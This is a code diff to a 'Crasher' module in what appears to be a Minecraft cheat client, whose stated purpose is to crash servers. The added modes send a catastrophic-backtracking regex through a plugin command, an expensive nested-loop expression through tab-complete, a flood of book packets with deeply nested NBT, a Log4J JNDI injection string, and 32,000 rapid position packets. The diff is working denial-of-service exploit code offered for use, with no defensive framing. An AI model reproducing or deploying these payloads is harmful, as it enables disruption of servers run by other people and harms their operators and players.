@@ -2,9 +2,9 @@ package wtf.atani.module.impl.misc;
 
 import net.minecraft.client.entity.EntityPlayerSP;
 import net.minecraft.entity.player.EntityPlayer;
-import net.minecraft.network.play.client.C03PacketPlayer;
-import net.minecraft.network.play.client.C0APacketAnimation;
-import net.minecraft.network.play.client.C12PacketUpdateSign;
+import net.minecraft.init.Items;
+import net.minecraft.item.ItemStack;
+import net.minecraft.network.play.client.*;
 import net.minecraft.util.BlockPos;
 import net.minecraft.util.ChatComponentText;
 import net.minecraft.util.IChatComponent;
@@ -14,13 +14,13 @@ import wtf.atani.module.Module;
 import wtf.atani.module.data.ModuleInfo;
 import wtf.atani.module.data.enums.Category;
 import wtf.atani.value.impl.StringBoxValue;
-
+import net.minecraft.nbt.*;
 import java.util.Random;
 
 @ModuleInfo(name = "Crasher", description = "Tries to crash a server", category = Category.MISCELLANEOUS)
 public class Crasher extends Module {
 
-    public StringBoxValue mode = new StringBoxValue("Mode", "Which mode will the module use?", this, new String[]{"Swing", "Sign", "Paralyze", "Chunk Load", "NaN Position", "Exploit Fixer (Old)"});
+    public StringBoxValue mode = new StringBoxValue("Mode", "Which mode will the module use?", this, new String[]{"Swing", "Sign", "Paralyze", "Chunk Load", "NaN Position", "Multiverse", "Fawe", "Mare", "Exploit Fixer (Old)"});
 
     private Random random = new Random();
 
@@ -29,6 +29,39 @@ public class Crasher extends Module {
     	if(mc.thePlayer == null || mc.theWorld == null)
     		return;
         switch (mode.getValue()) {
+            case "Multiverse":
+                mc.thePlayer.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
+                break;
+            case "Fawe":
+                sendPacketUnlogged(new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
+                break;
+            case "Mare":
+                for (int i = 0; i < 1200; i++) {
+                    final NBTTagCompound tag = new NBTTagCompound();
+                    final NBTTagList list = new NBTTagList();
+                    final StringBuilder value = new StringBuilder().append("{");
+                    final int amount = 1200;
+
+                    int i2;
+                    for (i2 = 0; i2 < amount; i2++) {
+                        value.append("extra:[{");
+                    }
+
+                    for (i2 = 0; i2 < amount; i2++) {
+                        value.append("text:\u2F9F}],");
+                    }
+
+                    value.append("text:\u2F9F}");
+                    list.appendTag(new NBTTagString(value.toString()));
+                    tag.setTag("pages", list);
+                    final ItemStack book = new ItemStack(Items.writable_book);
+                    book.setTagCompound(tag);
+                    sendPacketUnlogged(new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
+                }
+                break;
+            case "Log4J":
+                mc.thePlayer.sendChatMessage("/ ${jndi:rmi://localhost:3000}");
+                break;
             case "Swing":
                 for (int i = 0; i < 300; i++)
                     sendPacketUnlogged(new C0APacketAnimation());
@@ -45,15 +78,10 @@ public class Crasher extends Module {
                 }
                 break;
             case "Chunk Load":
-                if (mc.thePlayer.ticksExisted % 10 == 0) {
-                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
-                            mc.thePlayer.posX + 99413,
-                            mc.thePlayer.getEntityBoundingBox().minY,
-                            mc.thePlayer.posZ + 99413,
-                            true
-                    ));
+                double x = mc.thePlayer.posX, y = mc.thePlayer.posY, z = mc.thePlayer.posZ;
 
-                }
+                for (int i = 0; i < 32000; i++)
+                    sendPacketUnlogged(new C03PacketPlayer.C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
                 break;
             case "Nan Position":
                 mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
